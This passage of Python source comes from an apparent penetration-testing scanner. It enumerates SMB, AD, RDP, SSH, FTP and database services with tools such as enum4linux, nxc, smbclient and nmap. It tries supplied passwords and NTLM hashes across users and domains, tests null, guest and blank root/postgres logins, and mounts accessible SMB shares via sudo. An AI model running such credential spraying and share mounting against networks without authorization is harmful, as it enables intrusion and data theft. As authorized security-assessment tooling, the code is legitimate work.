        port_139 = next((service for service in services if service.port == 139), None)
        port_445 = next((service for service in services if service.port == 445), None)
        equivalent = bool(port_139 and port_445 and smb_services_are_equivalent(state, port_139, port_445))
        for endpoint in selected:
            source_ports = [endpoint.port]
            if equivalent and endpoint.port == 445:
                source_ports.append(139)
            credentials: list[dict[str, str]] = []
            seen: set[tuple[str, str, str, str]] = set()
            for source_port in source_ports:
                for credential in credentials_by_target.get((ip, source_port), []):
                    key = credential_key(credential)
                    if key in seen:
                        continue
                    seen.add(key)
                    credentials.append(credential)
            if credentials:
                result[(ip, endpoint.port)] = (endpoint, credentials)
    return result


def smb_auth_credentials_for_service(state: ScanState, service: ServiceRecord) -> list[dict[str, str]]:
    target = smb_enum_credentials_by_endpoint(state).get((service.ip, service.port))
    return target[1] if target else []


def build_enum4linux_command(ip: str, credential: dict[str, str]) -> tuple[list[str], list[str]]:
    command = ["enum4linux", "-a", "-A", "-d"]
    username = credential.get("username", "")
    password = credential.get("password", "")
    domain = credential.get("domain", "")
    if domain:
        command.extend(["-w", domain])
    command.extend(["-u", username, "-p", password, ip])
    return command, [password] if password else []


def run_enum4linux_for_valid_smb_credentials(args: argparse.Namespace, state: ScanState, logger: Logger) -> None:
    targets = smb_enum_credentials_by_endpoint(state)
    jobs: list[tuple[ServiceRecord, dict[str, str], list[str], list[str], Path]] = []
    raw_dir = Path(state.output_dir) / RAW_DIR / "services" / "smb" / "enum4linux"
    raw_dir.mkdir(parents=True, exist_ok=True)
    for _, (service, credentials) in sorted(targets.items(), key=lambda item: (ip_sort_key(item[0][0]), item[0][1])):
        for credential in credentials:
            method = credential.get("method", "")
            if method not in {"password", "anonymous"}:
                continue
            command, secrets = build_enum4linux_command(service.ip, credential)
            username = credential.get("username") or "anonymous"
            domain = credential.get("domain", "")
            principal = f"{domain}_{username}" if domain else username
            filename = f"enum4linux_{safe_filename(service.ip)}_{service.port}_{safe_filename(principal)}_{credential_fingerprint(credential)}.txt"
            jobs.append((service, credential, command, secrets, raw_dir / filename))

    if not jobs:
        logger.info("enum4linux: nenhuma credencial SMB válida por senha/anonymous; etapa não será exibida")
        state.metadata["enum4linux_jobs"] = 0
        return
    if not has_tool("enum4linux"):
        logger.warn("enum4linux não está disponível; não foi possível enumerar as credenciais SMB válidas.")
        state.metadata["enum4linux_ready"] = False
        state.metadata["enum4linux_jobs"] = len(jobs)
        return

    logger.info(f"enum4linux: executando {len(jobs)} enumeração(ões) para todas as credenciais SMB válidas")
    logger.info("enum4linux: o modo -A testa escrita criando e removendo temporariamente um diretório nos shares acessíveis")
    max_workers = max(1, min(8, THREAD_LEVELS[args.threads_level]["workers"], len(jobs)))

    def execute(job: tuple[ServiceRecord, dict[str, str], list[str], list[str], Path]) -> tuple[Any, ...]:
        service, credential, command, secrets, output_file = job
        result = run_service_command(command, output_file, args, logger, secrets)
        return service, credential, command, result

    completed: list[tuple[Any, ...]] = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(execute, job) for job in jobs]
        for future in concurrent.futures.as_completed(futures):
            completed.append(future.result())

    interesting_count = 0
    for service, credential, command, result in completed:
        parsed = parse_enum4linux_output(result.stdout + result.stderr)
        interesting = bool(parsed.get("interesting"))
        if interesting:
            interesting_count += 1
        description = str(parsed.pop("description", ""))
        parsed.update(
            {
                "interesting": interesting,
                "credential_label": credential.get("label", "anonymous"),
                "credential_id": credential_fingerprint(credential),
                "username": credential.get("username", ""),
                "domain": credential.get("domain", ""),
                "auth_method": credential.get("method", ""),
            }
        )
        principal = credential.get("label", "anonymous")
        state.add_evidence(
            Evidence(
                category="smb",
                ip=service.ip,
                port=service.port,
                service="smb",
                title=f"enum4linux — {principal}",
                description=description,
                command=shell_join(command),
                raw_output_file=relpath(result.output_file or "", state.output_dir),
                severity="medium" if interesting else "info",
                data=parsed,
            )
        )
    state.metadata["enum4linux_ready"] = True
    state.metadata["enum4linux_jobs"] = len(jobs)
    state.metadata["enum4linux_interesting_results"] = interesting_count
    logger.info(f"enum4linux concluído: {interesting_count}/{len(jobs)} execução(ões) com dados estruturados úteis")


def build_impacket_smbclient_command(args: argparse.Namespace, ip: str, port: int, input_file: Path, domain: str = "") -> tuple[list[str], list[str]]:
    command = ["impacket-smbclient", "-inputfile", str(input_file)]
    secrets: list[str] = []
    command.extend(["-port", str(port)])
    if args.ntlm_hash:
        command.extend(["-hashes", args.ntlm_hash])
        secrets.append(args.ntlm_hash)
    if args.kerberos:
        command.append("-k")
    if not (args.username or args.password or args.ntlm_hash or args.kerberos):
        command.append("-no-pass")
    
    eff_domain = domain if domain else getattr(args, "domain", "")
    if eff_domain and args.username:
        target = f"{eff_domain}/{args.username}"
    elif args.username:
        target = args.username
    else:
        target = ""
    if args.password and target:
        target = f"{target}:{args.password}"
        secrets.append(args.password)
    if target:
        target = f"{target}@{ip}"
    else:
        target = ip
    command.append(target)
    return command, secrets


def run_ad_discovery_helpers(args: argparse.Namespace, state: ScanState, logger: Logger) -> None:
    directory_services = [
        service
        for service in state.services
        if service.protocol == "tcp" and (service_group_name(service) in {"LDAP/AD", "KERBEROS"} or service.port in LDAP_PORTS | KERBEROS_PORTS)
    ]
    dc_ips = sorted({service.ip for service in directory_services}, key=ip_sort_key)
    if not dc_ips:
        return
    raw_dir = Path(state.output_dir) / RAW_DIR / "services" / "ad"
    raw_dir.mkdir(parents=True, exist_ok=True)
    for service in sorted_services_unique(service for service in directory_services if service_group_name(service) == "LDAP/AD"):
        dc_ip = service.ip
        port = service.port
        if has_tool("nxc"):
            for domain in collect_domains(args):
                dsuffix = f"_{safe_filename(domain)}" if domain else ""
                cred_args, secrets = credential_args(args, "nxc", domain)
                command = ["nxc", "ldap", dc_ip, "--port", str(port)] + cred_args
                result = run_service_command(command, raw_dir / f"nxc_ldap_{safe_filename(dc_ip)}_{port}{dsuffix}.txt", args, logger, secrets)
                add_tool_evidence(state, "ldap", dc_ip, port, "nxc ldap", result, parse_smb_keywords(result.stdout + result.stderr))
                update_host_from_smb_text(state, dc_ip, result.stdout + result.stderr)
    for dc_ip in dc_ips:
        run_host_reverse_lookup(args, state, dc_ip, logger, raw_dir)


def run_host_reverse_lookup(args: argparse.Namespace, state: ScanState, dc_ip: str, logger: Logger, raw_dir: Path) -> None:
    if not has_tool("host"):
        return
    for host_ip in sorted(state.hosts):
        command = ["host", "-p", "53", host_ip, dc_ip]
        result = run_service_command(command, raw_dir / f"host_{safe_filename(host_ip)}_via_{safe_filename(dc_ip)}.txt", args, logger, [])
        if result.returncode == 0 and "domain name pointer" in result.stdout:
            hostname = result.stdout.split("domain name pointer", 1)[1].strip().strip(".")
            state.upsert_host(host_ip, fqdn=hostname, sources=["host-reverse"])
            state.add_evidence(
                Evidence(
                    category="ad",
                    ip=host_ip,
                    port=None,
                    service="dns",
                    title="Reverse DNS name discovered through AD DNS",
                    description=hostname,
                    command=shell_join(result.redacted_command),
                    raw_output_file=relpath(result.output_file or "", state.output_dir),
                    severity="info",
                )
            )


def run_rdp_enum(args: argparse.Namespace, state: ScanState, logger: Logger) -> None:
    services = services_by_ports_or_group(state, RDP_PORTS, "RDP", {"tcp"})
    if not services:
        return
    raw_dir = Path(state.output_dir) / RAW_DIR / "services" / "rdp"
    raw_dir.mkdir(parents=True, exist_ok=True)
    for service in services:
        ip = service.ip
        port = service.port
        if has_tool("nmap"):
            command = ["nmap", "-Pn", "-p", str(port), "--script", "rdp-enum-encryption,rdp-ntlm-info", ip]
            result = run_service_command(command, raw_dir / f"nmap_rdp_{safe_filename(ip)}_{port}.txt", args, logger, [])
            add_tool_evidence(state, "rdp", ip, port, "nmap rdp scripts", result, parse_generic_keywords(result.stdout + result.stderr))
            if "Network Level Authentication" in result.stdout:
                state.add_evidence(
                    Evidence(
                        category="rdp",
                        ip=ip,
                        port=port,
                        service="rdp",
                        title="RDP exposed",
                        description=f"RDP is open on TCP/{port}; Nmap collected encryption/NLA metadata.",
                        command=shell_join(result.redacted_command),
                        raw_output_file=relpath(result.output_file or "", state.output_dir),
                        severity="low",
                    )
                )
        if has_tool("nxc"):
            for domain in collect_domains(args):
                dsuffix = f"_{safe_filename(domain)}" if domain else ""
                cred_args, secrets = credential_args(args, "nxc", domain)
                command = ["nxc", "rdp", ip, "--port", str(port)] + cred_args
                result = run_service_command(command, raw_dir / f"nxc_rdp_{safe_filename(ip)}_{port}{dsuffix}.txt", args, logger, secrets)
                add_tool_evidence(state, "rdp", ip, port, "nxc rdp", result, parse_generic_keywords(result.stdout + result.stderr))


def run_ssh_enum(args: argparse.Namespace, state: ScanState, logger: Logger) -> None:
    services = services_by_ports_or_group(state, SSH_PORTS, "SSH", {"tcp"})
    if not services:
        return
    raw_dir = Path(state.output_dir) / RAW_DIR / "services" / "ssh"
    raw_dir.mkdir(parents=True, exist_ok=True)
    for service in services:
        ip = service.ip
        port = service.port
        if has_tool("nmap"):
            command = ["nmap", "-Pn", "-p", str(port), "--script", "ssh2-enum-algos,ssh-hostkey", ip]
            result = run_service_command(command, raw_dir / f"nmap_ssh_{safe_filename(ip)}_{port}.txt", args, logger, [])
            add_tool_evidence(state, "ssh", ip, port, "nmap ssh scripts", result, parse_generic_keywords(result.stdout + result.stderr))
        banner = grab_tcp_banner(ip, port, timeout=THREAD_LEVELS[args.threads_level]["timeout"])
        if banner:
            state.add_evidence(
                Evidence(
                    category="ssh",
                    ip=ip,
                    port=port,
                    service="ssh",
                    title="SSH banner",
                    description=banner[:300],
                    severity="info",
                    data={"banner": banner[:1000]},
                )
            )


def run_ftp_enum(args: argparse.Namespace, state: ScanState, logger: Logger) -> None:
    services = services_by_ports_or_group(state, FTP_PORTS, "FTP", {"tcp"})
    if not services:
        return
    raw_dir = Path(state.output_dir) / RAW_DIR / "services" / "ftp"
    raw_dir.mkdir(parents=True, exist_ok=True)
    for service in services:
        ip = service.ip
        port = service.port
        if has_tool("nmap"):
            command = ["nmap", "-Pn", "-p", str(port), "--script", "ftp-anon,ftp-syst", ip]
            result = run_service_command(command, raw_dir / f"nmap_ftp_{safe_filename(ip)}_{port}.txt", args, logger, [])
            add_tool_evidence(state, "ftp", ip, port, "nmap ftp scripts", result, parse_generic_keywords(result.stdout + result.stderr))
            if "Anonymous FTP login allowed" in result.stdout:
                state.add_evidence(
                    Evidence(
                        category="ftp",
                        ip=ip,
                        port=port,
                        service="ftp",
                        title="Anonymous FTP enabled",
                        description="Nmap ftp-anon indicates anonymous FTP access.",
                        command=shell_join(result.redacted_command),
                        raw_output_file=relpath(result.output_file or "", state.output_dir),
                        severity="medium",
                    )
                )
        # FTP auth attempts are handled centrally by run_credential_auth_enumeration
        # to avoid duplication; here we only do Nmap NSE and NXC enumeration.
        if has_tool("nxc"):
            for domain in collect_domains(args):
                dsuffix = f"_{safe_filename(domain)}" if domain else ""
                cred_args, secrets = credential_args(args, "nxc", domain)
                command = ["nxc", "ftp", ip, "--port", str(port)] + cred_args
                result = run_service_command(command, raw_dir / f"nxc_ftp_{safe_filename(ip)}_{port}{dsuffix}.txt", args, logger, secrets)
                add_tool_evidence(state, "ftp", ip, port, "nxc ftp", result, parse_generic_keywords(result.stdout + result.stderr))




def nt_hash_component(value: str) -> str:
    normalized = normalize_ntlm_hash(value)
    return normalized.rsplit(":", 1)[-1]


def smbclient_auth_args(credential: dict[str, str]) -> tuple[list[str], list[str]]:
    username = credential.get("username", "")
    password = credential.get("password", "")
    domain = credential.get("domain", "")
    method = credential.get("method", "")
    if method == "null" or (method == "anonymous" and not username):
        return ["-U", "%", "-N"], []
    if method == "anonymous":
        principal = f"{domain}/{username}" if domain else username
        return ["-U", f"{principal}%", "-N"], []
    principal = f"{domain}/{username}" if domain else username
    if method == "hash":
        return ["-U", principal, "--pw-nt-hash", "--password", nt_hash_component(password)], [password, nt_hash_component(password)]
    return ["-U", f"{principal}%{password}"], [password]


def smb_credential_label(credential: dict[str, str]) -> str:
    method = credential.get("method", "")
    username = credential.get("username", "")
    domain = credential.get("domain", "")
    if method == "null" or (method == "anonymous" and not username):
        return "null session"
    if method == "anonymous":
        return f"{username or 'guest'} (anonymous/guest)"
    principal = f"{domain}\\{username}" if domain else username
    return f"{principal} ({'NT hash' if method == 'hash' else 'senha'})"


def direct_smb_credentials(args: argparse.Namespace) -> list[dict[str, str]]:
    credentials: list[dict[str, str]] = []
    seen: set[tuple[str, str, str, str]] = set()
    users = [username for username in collect_credential_usernames(args) if username]
    # Try both local/unqualified and every explicitly supplied domain.
    domains = [""]
    for domain in collect_domains(args):
        if domain not in domains:
            domains.append(domain)
    secrets = [
        *((password, "password") for password in collect_credential_passwords(args)),
        *((ntlm_hash, "hash") for ntlm_hash in collect_credential_hashes(args)),
    ]
    # Share authorization can differ per identity.  Validate every supplied
    # user × password/hash × domain possibility once at the endpoint, then
    # discard definitive authentication failures before per-share probing.
    for domain in domains:
        for username in users:
            for secret, method in secrets:
                credential = {
                    "username": username,
                    "password": secret,
                    "method": method,
                    "domain": domain,
                }
                credential["label"] = smb_credential_label(credential)
                key = credential_key(credential)
                if key not in seen:
                    seen.add(key)
                    credentials.append(credential)
    return credentials


def smb_mapping_credentials(
    direct_credentials: list[dict[str, str]],
    validated_credentials: list[dict[str, str]],
) -> tuple[list[dict[str, str]], set[tuple[str, str, str, str]]]:
    validated_keys: set[tuple[str, str, str, str]] = set()
    for credential in validated_credentials:
        normalized = dict(credential)
        if normalized.get("method") == "anonymous" and not normalized.get("username"):
            normalized["method"] = "null"
        validated_keys.add(credential_key(normalized))
    candidates: list[dict[str, str]] = []
    seen: set[tuple[str, str, str, str]] = set()
    builtins = [
        {"username": "", "password": "", "method": "null", "domain": "", "label": "null session"},
        {"username": "guest", "password": "", "method": "anonymous", "domain": "", "label": "guest (anonymous/guest)"},
    ]
    for source in [*validated_credentials, *direct_credentials, *builtins]:
        credential = dict(source)
        # Historical evidence calls an empty anonymous login "anonymous";
        # normalize it to the same null-session identity used by the mapper so
        # that the same network attempt is not repeated under two labels.
        if credential.get("method") == "anonymous" and not credential.get("username"):
            credential["method"] = "null"
        credential["label"] = smb_credential_label(credential)
        key = credential_key(credential)
        if key in seen:
            continue
        seen.add(key)
        candidates.append(credential)
    return candidates, validated_keys


def smbclient_share_command(ip: str, port: int, share: str, credential: dict[str, str]) -> tuple[list[str], list[str]]:
    auth_args, secrets = smbclient_auth_args(credential)
    return ["smbclient", f"//{ip}/{share}", "-p", str(port), *auth_args], secrets


def credential_fingerprint(credential: dict[str, str]) -> str:
    serialized = "\0".join(credential_key(credential))
    return hashlib.sha256(serialized.encode("utf-8", errors="surrogateescape")).hexdigest()[:12]


def smb_mapping_directory_name(
    ip: str,
    port: int,
    credential: dict[str, str],
    identity_count: int,
) -> str:
    username = credential.get("username") or "anonymous"
    domain = safe_filename(credential.get("domain") or "local")
    method = safe_filename(credential.get("method") or "unknown")
    return f"smb-{safe_filename(ip)}-{safe_filename(username)}-{domain}-{method}-{credential_fingerprint(credential)}-p{port}"


def enum4linux_share_permissions(
    state: ScanState,
    ip: str,
    port: int,
    credential: dict[str, str],
) -> list[dict[str, Any]]:
    expected_user = credential.get("username", "")
    expected_domain = credential.get("domain", "")
    expected_method = credential.get("method", "")
    expected_methods = {expected_method}
    if expected_method == "null":
        expected_methods.add("anonymous")
    compatible_ids = {credential_fingerprint(credential)}
    if expected_method == "null":
        anonymous_credential = dict(credential)
        anonymous_credential["method"] = "anonymous"
        compatible_ids.add(credential_fingerprint(anonymous_credential))
    for item in state.evidence:
        if item.category != "smb" or item.ip != ip or item.port != port or not item.title.startswith("enum4linux"):
            continue
        stored_id = str(item.data.get("credential_id", ""))
        if stored_id and stored_id not in compatible_ids:
            continue
        if str(item.data.get("username", "")) != expected_user:
            continue
        if str(item.data.get("domain", "")) != expected_domain:
            continue
        if str(item.data.get("auth_method", "")) not in expected_methods:
            continue
        shares = item.data.get("shares", [])
        if isinstance(shares, list):
            return [share for share in shares if isinstance(share, dict)]
    return []


def write_cifs_credentials_file(credential: dict[str, str]) -> Path | None:
    password = credential.get("password", "")
    if any("\n" in credential.get(field, "") or "\r" in credential.get(field, "") for field in ("username", "password", "domain")):
        return None
    fd, filename = tempfile.mkstemp(prefix="birdscan-cifs-", suffix=".cred", dir="/tmp", text=True)
    path = Path(filename)
    try:
        os.fchmod(fd, 0o600)
        content = [f"username={credential.get('username', '')}", f"password={password}"]
        if credential.get("domain"):
            content.append(f"domain={credential['domain']}")
        with os.fdopen(fd, "w", encoding="utf-8", errors="surrogateescape") as handle:
            fd = -1
            handle.write("\n".join(content) + "\n")
            handle.flush()
            os.fsync(handle.fileno())
    finally:
        if fd >= 0:
            os.close(fd)
    return path


def reusable_cifs_mount_command(
    ip: str,
    port: int,
    share: str,
    mount_dir: str | Path,
    credential: dict[str, str],
) -> str:
    """Build a reusable mount command for password or guest SMB access."""
    method = normalize_auth_method(credential.get("method", ""), username=credential.get("username", ""))
    if method == "hash":
        return ""
    options = [f"port={port}"]
    if method == "anonymous":
        options.append("guest")
        mount = "sudo mount"
    else:
        username = credential.get("username", "")
        if not username:
            return ""
        options.append(f"username={username}")
        if credential.get("domain"):
            options.append(f"domain={credential['domain']}")
        mount = f"sudo env PASSWD={shlex_quote(credential.get('password', ''))} mount"
    destination = shlex_quote(str(mount_dir))
    source = shlex_quote(f"//{ip}/{share}")
    return (
        f"sudo mkdir -p {destination} && {mount} -t cifs {source} {destination} "
        f"-o {shlex_quote(','.join(options))}"
    )


def run_smb_share_mapping(args: argparse.Namespace, state: ScanState, logger: Logger) -> None:
    base_dir = Path(args.map_shares or "/tmp/shares")
    base_dir.mkdir(parents=True, exist_ok=True)
    if not has_tool("smbclient"):
        logger.warn("smbclient não está disponível; o mapeamento de compartilhamentos foi ignorado.")
        return
    smb_services: list[ServiceRecord] = []
    by_host: dict[str, list[ServiceRecord]] = {}
    for service in services_for_group(state, "SMB", {"tcp"}):
        by_host.setdefault(service.ip, []).append(service)
    for services in by_host.values():
        smb_services.extend(preferred_smb_services(state, services))
    if not smb_services:
        logger.info("Mapeamento SMB: nenhum endpoint SMB disponível")
        return

    raw_dir = Path(state.output_dir) / RAW_DIR / "services" / "smb" / "share-validation"
    raw_dir.mkdir(parents=True, exist_ok=True)
    direct_credentials = direct_smb_credentials(args)
    # Clear stale mapping evidence for both selected and collapsed 139/445
    # endpoints before rebuilding the authorization-backed result.
    endpoint_keys = {
        (service.ip, service.port)
        for host_services in by_host.values()
        for service in host_services
    }
    state.evidence = [
        item
        for item in state.evidence
        if not (
            item.category == "smb"
            and (item.ip, item.port) in endpoint_keys
            and item.title.startswith("Acesso SMB por usuário —")
        )
    ]

    for service in sorted(smb_services, key=lambda item: (ip_sort_key(item.ip), item.port)):
        ip = service.ip
        # This tree can contain remote filesystems and user-owned files.
        # A filename prefix is not proof that a file belongs to this run.
        # Never traverse or clean the mount tree; refresh report evidence only.
        for stale_file in raw_dir.glob(f"access_{safe_filename(ip)}_{service.port}_*.txt"):
            try:
                stale_file.unlink()
            except OSError:
                pass
        for stale_file in raw_dir.glob(f"shares_{safe_filename(ip)}_{service.port}_*.txt"):
            try:
                stale_file.unlink()
            except OSError:
                pass
        validated_credentials = smb_auth_credentials_for_service(state, service)
        credentials, validated_keys = smb_mapping_credentials(direct_credentials, validated_credentials)
        logger.info(
            f"SMB {ip}:{service.port}: descobrindo shares e validando {len(credentials)} identidade(s) por share"
        )

        share_names: dict[str, str] = {
            name.lower(): name for name in smb_share_names_from_evidence(state, ip, service.port)
            if name.lower() != "ipc$"
        }
        eligible_credentials: list[dict[str, str]] = []
        for credential in credentials:
            auth_args, secrets = smbclient_auth_args(credential)
            credential_id = credential_fingerprint(credential)
            discovery_file = raw_dir / f"shares_{safe_filename(ip)}_{service.port}_{credential_id}.txt"
            list_cmd = ["smbclient", "-L", f"//{ip}", "-p", str(service.port), *auth_args]
            list_result = run_service_command(list_cmd, discovery_file, args, logger, secrets)
            combined = list_result.stdout + list_result.stderr
            explicit_auth_failure = smb_authentication_failed(combined)
            if credential_key(credential) in validated_keys or not explicit_auth_failure:
                eligible_credentials.append(credential)
            discovered_names = parse_smbclient_share_listing(list_result.stdout)
            # Discovery is deliberately permissive: some servers return a
            # non-zero status after printing the share table.  A printed share
            # name is still a candidate, while authorization is decided only
            # by the later per-share ``-c ls`` probe.
            if discovered_names and not explicit_auth_failure:
                for name in discovered_names:
                    if name.lower() != "ipc$":
                        share_names.setdefault(name.lower(), name)
            elif list_result.output_file:
                try:
                    Path(list_result.output_file).unlink()
                except OSError:
                    pass

        if not share_names:
            logger.info(f"SMB {ip}:{service.port}: nenhum nome de share foi descoberto; validação ignorada")
            continue

        identity_counts: dict[str, int] = {}
        for credential in eligible_credentials:
            identity = safe_filename(credential.get("username") or credential.get("method") or "anonymous").lower()
            identity_counts[identity] = identity_counts.get(identity, 0) + 1

        for credential in eligible_credentials:
            username = credential.get("username", "")
            method = credential.get("method", "")
            credential_label = smb_credential_label(credential)
            credential_id = credential_fingerprint(credential)
            _, secrets = smbclient_auth_args(credential)
            permission_rows = enum4linux_share_permissions(state, ip, service.port, credential)
            permissions_by_share = {str(row.get("name", "")).lower(): row for row in permission_rows}
            accessible_shares: list[dict[str, Any]] = []

            for share in sorted(share_names.values(), key=str.lower):
                validation_file = raw_dir / (
                    f"access_{safe_filename(ip)}_{service.port}_{safe_filename(share)}_{credential_id}.txt"
                )
                share_cmd, share_secrets = smbclient_share_command(ip, service.port, share, credential)
                validation_cmd = [*share_cmd, "-c", "ls"]
                validation_result = run_service_command(
                    validation_cmd,
                    validation_file,
                    args,
                    logger,
                    share_secrets,
                )
                if not smb_share_access_succeeded(validation_result):
                    logger.info(f"SMB sem acesso: //{ip}/{share} via {credential_label}")
                    if validation_result.output_file:
                        try:
                            Path(validation_result.output_file).unlink()
                        except OSError:
                            pass
                    continue

                permission = permissions_by_share.get(share.lower(), {})
                positive_permissions = [
                    str(label).strip().upper()
                    for label in permission.get("permissions", [])
                    if str(label).strip() and "DENIED" not in str(label).upper() and str(label).upper() != "VISIBLE"
                ]
                permissions = dedupe_text(["ACCESS", "VIEW", *positive_permissions])
                interaction_command = shell_join(share_cmd)
                mount_success = False
                mount_returncode: int | None = None
                mounted_path = ""
                identity = safe_filename(username or method or "anonymous").lower()
                identity_count = identity_counts.get(identity, 1)
                directory_name = smb_mapping_directory_name(ip, service.port, credential, identity_count)
                share_dir = base_dir / directory_name / safe_filename(share)
                mount_command = reusable_cifs_mount_command(ip, service.port, share, share_dir, credential)
                can_mount = method in {"password", "anonymous", "null"} and has_tool("mount.cifs")
                mount_prefix: list[str] = []
                if hasattr(os, "geteuid") and os.geteuid() != 0:
                    can_mount = can_mount and has_tool("sudo")
                    mount_prefix = ["sudo"] if can_mount else []
                credentials_file: Path | None = None
                if can_mount:
                    share_dir.mkdir(parents=True, exist_ok=True)
                    mount_success = os.path.ismount(share_dir)
                    mount_returncode = 0 if mount_success else None
                    if not mount_success:
                        options = [f"port={service.port}"]
                        if method in {"anonymous", "null"}:
                            options.append("guest")
                        else:
                            credentials_file = write_cifs_credentials_file(credential)
                            if credentials_file is None:
                                can_mount = False
                            else:
                                options.append(f"credentials={credentials_file}")
                        if can_mount:
                            mount_cmd = [
                                *mount_prefix,
                                "mount",
                                "-t",
                                "cifs",
                                f"//{ip}/{share}",
                                str(share_dir),
                                "-o",
                                ",".join(options),
                            ]
                            logger.info(f"Acesso validado; montando //{ip}/{share} via {credential_label}")
                            mount_result = run_command(mount_cmd, timeout=20, logger=logger, secrets=secrets)
                            mount_returncode = mount_result.returncode
                            mount_success = (
                                mount_result.returncode == 0
                                and os.path.ismount(share_dir)
                                and not smb_access_denied(mount_result.stdout + mount_result.stderr)
                            )
                    if credentials_file is not None:
                        try:
                            credentials_file.unlink()
                        except OSError:
                            pass
                    if mount_success:
                        mounted_path = str(share_dir)
                    else:
                        try:
                            share_dir.rmdir()
                            share_dir.parent.rmdir()
                        except OSError:
                            pass

                accessible_shares.append(
                    {
                        "name": share,
                        "permissions": permissions,
                        "path": mounted_path,
                        "mounted": mount_success,
                        "listing_success": True,
                        "mount_returncode": mount_returncode,
                        "validation_tool": "smbclient",
                        "validation_command": shell_join(validation_cmd),
                        "validation_output_file": relpath(validation_result.output_file or "", state.output_dir),
                        "interaction_command": interaction_command,
                        "mount_command": mount_command,
                    }
                )

            if accessible_shares:
                state.add_evidence(
                    Evidence(
                        category="smb",
                        ip=ip,
                        port=service.port,
                        service="smb",
                        title=f"Acesso SMB por usuário — {credential_label}",
                        description=(
                            f"Acesso efetivo validado com smbclient para {credential_label} em "
                            f"{len(accessible_shares)} compartilhamento(s)."
                        ),
                        severity="medium",
                        data={
                            "interesting": True,
                            "credential_label": credential_label,
                            "credential_id": credential_id,
                            "username": username,
                            "domain": credential.get("domain", ""),
                            "auth_method": method,
                            "shares": accessible_shares,
                            "mapping_root": str(base_dir / smb_mapping_directory_name(
                                ip,
                                service.port,
                                credential,
                                identity_counts.get(safe_filename(username or method or "anonymous").lower(), 1),
                            )),
                        },
                    )
                )
    state.metadata["smb_mapping_root"] = str(base_dir)
    logger.info(f"Mapeamento SMB concluído em {base_dir}")


def try_ftp_login(ip: str, port: int, username: str, password: str, timeout: int) -> tuple[bool, str]:
    lines = [
        f"Target: {ip}:{port}",
        f"Username: {username}",
        "Password: ***",
        "",
    ]
    try:
        with ftplib.FTP() as ftp:
            ftp.connect(ip, port, timeout=timeout)
            welcome = ftp.getwelcome()
            if welcome:
                lines.append(f"Welcome: {welcome}")
            ftp.login(username, password)
            lines.append("Login: accepted")
            try:
                lines.append(f"PWD: {ftp.pwd()}")
            except ftplib.all_errors as exc:
                lines.append(f"PWD error: {exc}")
            listing: list[str] = []
            try:
                ftp.retrlines("LIST", listing.append)
            except ftplib.all_errors as exc:
                lines.append(f"LIST error: {exc}")
            if listing:
                lines.append("")
                lines.append("--- LIST sample ---")
                lines.extend(listing[:50])
            try:
                ftp.quit()
            except ftplib.all_errors:
                pass
        return True, "\n".join(lines) + "\n"
    except ftplib.all_errors as exc:
        lines.append("Login: rejected_or_failed")
        lines.append(f"Error: {exc}")
        return False, "\n".join(lines) + "\n"
    except OSError as exc:
        lines.append("Login: connection_failed")
        lines.append(f"Error: {exc}")
        return False, "\n".join(lines) + "\n"


def run_database_enum(args: argparse.Namespace, state: ScanState, logger: Logger) -> None:
    raw_dir = Path(state.output_dir) / RAW_DIR / "services" / "databases"
    raw_dir.mkdir(parents=True, exist_ok=True)
    db_checks = [
        (MYSQL_PORTS, "mysql", "mysql-info", ["mysql"]),
        (POSTGRES_PORTS, "postgresql", "pgsql-info", ["postgres", "postgresql"]),
        (MSSQL_PORTS, "mssql", "ms-sql-info", ["ms-sql", "mssql", "sql server"]),
    ]
    for ports, name, script, tokens in db_checks:
        for service in database_services_for_check(state, ports, tokens):
            if has_tool("nmap"):
                command = ["nmap", "-Pn", "-p", str(service.port), "--script", script, service.ip]
                result = run_service_command(command, raw_dir / f"nmap_{name}_{safe_filename(service.ip)}_{service.port}.txt", args, logger, [])
                add_tool_evidence(state, name, service.ip, service.port, f"nmap {script}", result, parse_generic_keywords(result.stdout + result.stderr))
            
            if name == "mysql" and has_tool("mysql"):
                command = ["mysql", "-h", service.ip, "-P", str(service.port), "-u", "root", "-e", "quit"]
                result = run_service_command(command, raw_dir / f"mysql_anon_{safe_filename(service.ip)}_{service.port}.txt", args, logger, [])
                success = result.returncode == 0 and "Access denied" not in result.stderr
                record_auth_attempt_evidence(
                    state, service, category="database", protocol="mysql", tool="mysql",
                    pair=CredentialPair("root", ""), mode="anonymous", success=success,
                    command=shell_join(command), raw_output_file=relpath(result.output_file or "", state.output_dir), transcript=result.stdout + result.stderr
                )
            
            if name == "postgresql" and has_tool("psql"):
                command = ["psql", "-h", service.ip, "-p", str(service.port), "-U", "postgres", "-d", "postgres", "-c", "\\q"]
                result = run_service_command(command, raw_dir / f"psql_anon_{safe_filename(service.ip)}_{service.port}.txt", args, logger, [])
                success = result.returncode == 0 and "authentication failed" not in (result.stdout + result.stderr).lower()
                record_auth_attempt_evidence(
                    state, service, category="database", protocol="postgres", tool="psql",
                    pair=CredentialPair("postgres", ""), mode="anonymous", success=success,
                    command=shell_join(command), raw_output_file=relpath(result.output_file or "", state.output_dir), transcript=result.stdout + result.stderr
                )

            if name == "mssql" and has_tool("nxc"):
                for domain in collect_domains(args):
                    dsuffix = f"_{safe_filename(domain)}" if domain else ""
                    cred_args, secrets = credential_args(args, "nxc", domain)
                    command = ["nxc", "mssql", service.ip, "--port", str(service.port)] + cred_args
                    result = run_service_command(command, raw_dir / f"nxc_mssql_{safe_filename(service.ip)}_{service.port}{dsuffix}.txt", args, logger, secrets)
                    add_tool_evidence(state, name, service.ip, service.port, "nxc mssql", result, parse_generic_keywords(result.stdout + result.stderr))
            state.add_evidence(
                Evidence(
                    category="database",
                    ip=service.ip,
                    port=service.port,
                    service=name,
                    title=f"{name.upper()} exposed",
                    description=f"{name} service is reachable on TCP/{service.port}.",
                    severity="low",
                )
            )


def database_services_for_check(state: ScanState, ports: set[int], tokens: list[str]) -> list[ServiceRecord]:
    services: list[ServiceRecord] = []
    for service in state.services:
        if service.protocol != "tcp":
            continue
        descriptor = f"{service.service} {service.product} {service.version} {service.banner}".lower()
        if service.port in ports or any(token in descriptor for token in tokens):
            services.append(service)
    return sorted_services_unique(services)


def run_generic_service_enum(args: argparse.Namespace, state: ScanState, logger: Logger) -> None:
    raw_dir = Path(state.output_dir) / RAW_DIR / "services" / "generic"
    raw_dir.mkdir(parents=True, exist_ok=True)
    generic_scripts = [
        (NFS_PORTS, "nfs", "nfs-showmount,nfs-ls,nfs-statfs", ["nfs", "rpcbind"]),
